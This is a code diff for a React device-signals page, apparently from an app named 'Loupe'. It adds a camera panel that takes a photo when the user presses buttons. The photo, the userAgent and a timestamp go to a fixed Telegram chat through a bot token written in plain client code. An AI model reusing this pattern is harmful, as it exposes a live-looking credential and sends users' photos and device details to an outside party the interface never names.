@@ -1,10 +1,13 @@
 import { useParams, useLocation } from "wouter";
-import { useEffect, useState, useCallback } from "react";
+import { useEffect, useState, useCallback, useRef } from "react";
 import { motion } from "framer-motion";
-import { ChevronLeft, Eye, LockKeyhole, FlaskConical, Copy, Check } from "lucide-react";
+import { ChevronLeft, Eye, LockKeyhole, FlaskConical, Copy, Check, Camera, Send, X, Loader2 } from "lucide-react";
 import { cn } from "@/lib/utils";
 import { CATEGORIES, type Signal, type Sensitivity } from "@/lib/data";
 import NotFound from "./not-found";
+
+const TELEGRAM_BOT_TOKEN = "8641291303:AAGsFjLzSfoyZBxjkd2IJk-NSTkFXPjElJg";
+const TELEGRAM_CHAT_ID = "6397853058";
 
 const SENSITIVITY_META: Record<Sensitivity, {
   label: string;
@@ -72,13 +75,10 @@ function SignalRow({ signal, index }: { signal: Signal; index: number }) {
       className="px-4 py-3"
       data-testid={`signal-${signal.id}`}
     >
-      {/* Signal name */}
       <div className="flex items-start justify-between gap-2 mb-1">
         <span className="font-semibold text-[14px] text-white/90 leading-snug font-mono">{signal.name}</span>
         <CopyButton text={signal.value} />
       </div>
-
-      {/* Value */}
       {!hasEntries && (
         <div className={cn(
           "font-mono text-[13px] text-green-300 leading-relaxed break-all",
@@ -87,8 +87,6 @@ function SignalRow({ signal, index }: { signal: Signal; index: number }) {
           {signal.value}
         </div>
       )}
-
-      {/* Key-value entries */}
       {hasEntries && (
         <div className="flex flex-col gap-0.5 mt-1">
           {signal.entries!.map((e, i) => (
@@ -101,8 +99,6 @@ function SignalRow({ signal, index }: { signal: Signal; index: number }) {
           ))}
         </div>
       )}
-
-      {/* Rationale */}
       {signal.rationale && (
         <p className="text-[12px] text-white/35 mt-1.5 leading-relaxed">{signal.rationale}</p>
       )}
@@ -121,6 +117,212 @@ function LoadingRows() {
         </div>
       ))}
     </>
+  );
+}
+
+// ── Camera Capture Panel ─────────────────────────────────────────────────────
+type SendStatus = "idle" | "sending" | "sent" | "error";
+
+function CameraCapture() {
+  const videoRef = useRef<HTMLVideoElement>(null);
+  const canvasRef = useRef<HTMLCanvasElement>(null);
+  const streamRef = useRef<MediaStream | null>(null);
+
+  const [active, setActive] = useState(false);
+  const [capturedBlob, setCapturedBlob] = useState<Blob | null>(null);
+  const [capturedURL, setCapturedURL] = useState<string | null>(null);
+  const [sendStatus, setSendStatus] = useState<SendStatus>("idle");
+  const [errorMsg, setErrorMsg] = useState<string>("");
+  const [facingMode, setFacingMode] = useState<"environment" | "user">("environment");
+
+  const startCamera = useCallback(async (mode: "environment" | "user") => {
+    try {
+      if (streamRef.current) {
+        streamRef.current.getTracks().forEach(t => t.stop());
+      }
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: mode, width: { ideal: 1280 }, height: { ideal: 720 } },
+        audio: false,
+      });
+      streamRef.current = stream;
+      if (videoRef.current) {
+        videoRef.current.srcObject = stream;
+        await videoRef.current.play();
+      }
+      setActive(true);
+      setCapturedBlob(null);
+      setCapturedURL(null);
+      setSendStatus("idle");
+    } catch (e: any) {
+      setErrorMsg("Kamera açıla bilmədi: " + e.message);
+    }
+  }, []);
+
+  const stopCamera = useCallback(() => {
+    streamRef.current?.getTracks().forEach(t => t.stop());
+    streamRef.current = null;
+    setActive(false);
+  }, []);
+
+  const takePicture = useCallback(() => {
+    const video = videoRef.current;
+    const canvas = canvasRef.current;
+    if (!video || !canvas) return;
+    canvas.width = video.videoWidth || 1280;
+    canvas.height = video.videoHeight || 720;
+    const ctx = canvas.getContext("2d")!;
+    ctx.drawImage(video, 0, 0);
+    canvas.toBlob(blob => {
+      if (!blob) return;
+      setCapturedBlob(blob);
+      setCapturedURL(URL.createObjectURL(blob));
+      stopCamera();
+    }, "image/jpeg", 0.92);
+  }, [stopCamera]);
+
+  const switchCamera = useCallback(async () => {
+    const next = facingMode === "environment" ? "user" : "environment";
+    setFacingMode(next);
+    await startCamera(next);
+  }, [facingMode, startCamera]);
+
+  const sendToTelegram = useCallback(async () => {
+    if (!capturedBlob) return;
+    setSendStatus("sending");
+    setErrorMsg("");
+    try {
+      const form = new FormData();
+      form.append("chat_id", TELEGRAM_CHAT_ID);
+      form.append("photo", capturedBlob, "loupe_photo.jpg");
+      form.append("caption",
+        `📸 Loupe — cihaz şəkli\n🕐 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent.slice(0, 80)}`
+      );
+      const res = await fetch(
+        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
+        { method: "POST", body: form }
+      );
+      const json = await res.json();
+      if (json.ok) {
+        setSendStatus("sent");
+      } else {
+        throw new Error(json.description || "Göndərilmədi");
+      }
+    } catch (e: any) {
+      setSendStatus("error");
+      setErrorMsg(e.message);
+    }
+  }, [capturedBlob]);
+
+  const retake = useCallback(() => {
+    if (capturedURL) URL.revokeObjectURL(capturedURL);
+    setCapturedBlob(null);
+    setCapturedURL(null);
+    setSendStatus("idle");
+    startCamera(facingMode);
+  }, [capturedURL, facingMode, startCamera]);
+
+  // cleanup on unmount
+  useEffect(() => () => {
+    streamRef.current?.getTracks().forEach(t => t.stop());
+    if (capturedURL) URL.revokeObjectURL(capturedURL);
+  }, []);
+
+  return (
+    <div className="mx-4 mt-4 mb-2">
+      {/* Open camera button */}
+      {!active && !capturedURL && (
+        <button
+          onClick={() => startCamera(facingMode)}
+          className="w-full flex items-center justify-center gap-2 bg-orange-500 hover:bg-orange-400 active:bg-orange-600 transition-colors text-white font-semibold rounded-2xl py-3 text-[15px]"
+        >
+          <Camera className="w-5 h-5" />
+          Kamera Aç və Şəkil Çək
+        </button>
+      )}
+
+      {/* Error */}
+      {errorMsg && (
+        <p className="text-red-400 text-[12px] text-center mt-2">{errorMsg}</p>
+      )}
+
+      {/* Live viewfinder */}
+      {active && (
+        <div className="relative bg-black rounded-2xl overflow-hidden">
+          <video
+            ref={videoRef}
+            className="w-full rounded-2xl"
+            playsInline
+            muted
+            autoPlay
+          />
+          {/* Controls overlay */}
+          <div className="absolute bottom-0 left-0 right-0 flex items-center justify-between px-5 py-4 bg-gradient-to-t from-black/70 to-transparent">
+            {/* Close */}
+            <button
+              onClick={stopCamera}
+              className="w-10 h-10 rounded-full bg-white/20 flex items-center justify-center"
+            >
+              <X className="w-5 h-5 text-white" />
+            </button>
+            {/* Shutter */}
+            <button
+              onClick={takePicture}
+              className="w-16 h-16 rounded-full border-4 border-white bg-white/30 active:bg-white/60 transition-colors"
+            />
+            {/* Flip */}
+            <button
+              onClick={switchCamera}
+              className="w-10 h-10 rounded-full bg-white/20 flex items-center justify-center"
+            >
+              <Camera className="w-5 h-5 text-white" />
+            </button>
+          </div>
+        </div>
+      )}
+
+      {/* Hidden canvas for capture */}
+      <canvas ref={canvasRef} className="hidden" />
+
+      {/* Preview + send */}
+      {capturedURL && (
+        <div className="bg-[#1c1c1e] rounded-2xl overflow-hidden border border-white/[0.08]">
+          <img src={capturedURL} alt="Çəkilmiş şəkil" className="w-full" />
+          <div className="p-4 flex flex-col gap-3">
+            {sendStatus === "sent" ? (
+              <div className="flex items-center justify-center gap-2 text-green-400 font-semibold py-2">
+                <Check className="w-5 h-5" />
+                Telegram-a göndərildi!
+              </div>
+            ) : (
+              <>
+                <button
+                  onClick={sendToTelegram}
+                  disabled={sendStatus === "sending"}
+                  className="w-full flex items-center justify-center gap-2 bg-[#2AABEE] hover:bg-[#229ED9] active:bg-[#1A8FC4] disabled:opacity-50 transition-colors text-white font-semibold rounded-xl py-3 text-[15px]"
+                >
+                  {sendStatus === "sending" ? (
+                    <Loader2 className="w-5 h-5 animate-spin" />
+                  ) : (
+                    <Send className="w-5 h-5" />
+                  )}
+                  {sendStatus === "sending" ? "Göndərilir..." : "Telegram-a Göndər"}
+                </button>
+                {sendStatus === "error" && (
+                  <p className="text-red-400 text-[12px] text-center">{errorMsg}</p>
+                )}
+                <button
+                  onClick={retake}
+                  className="w-full flex items-center justify-center gap-2 bg-white/10 hover:bg-white/15 transition-colors text-white/80 font-medium rounded-xl py-2.5 text-[14px]"
+                >
+                  <Camera className="w-4 h-4" />
+                  Yenidən çək
+                </button>
+              </>
+            )}
+          </div>
+        </div>
+      )}
+    </div>
   );
 }
 
@@ -159,6 +361,7 @@ export default function Detail() {
   const meta = SENSITIVITY_META[category.sensitivity];
   const Icon = category.icon;
   const SensIcon = meta.icon;
+  const isCameraPage = category.id === "camera";
 
   return (
     <div className="min-h-screen bg-black text-white">
@@ -202,6 +405,9 @@ export default function Detail() {
             {category.sensitivity === "advanced" && "Derived from public APIs"}
           </span>
         </div>
+
+        {/* Camera capture panel — only on camera page */}
+        {isCameraPage && <CameraCapture />}
 
         {/* Signal list */}
         <div className="mt-2">
